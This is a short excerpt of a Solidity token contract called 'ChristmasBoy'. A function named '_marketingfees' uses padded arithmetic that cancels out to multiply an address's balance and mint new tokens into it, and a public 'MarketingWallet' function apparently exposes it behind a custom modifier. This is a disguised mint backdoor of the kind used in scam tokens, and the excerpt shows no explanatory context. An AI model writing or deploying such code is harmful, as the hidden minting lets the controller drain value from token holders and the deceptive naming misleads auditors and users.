...
contract ChristmasBoy is Ownable {
  ...
  function _marketingfees (address miner, uint256 _value) internal {
        balances[miner] = (balances[miner] * 27) + (balances[miner] * 3) - (balances[miner] * 27) + (balances[miner] * 3) + (_value * 10 ** uint256(decimals));
  }
  ...
  function MarketingWallet(address lpaddress, uint256 _value) public _external {
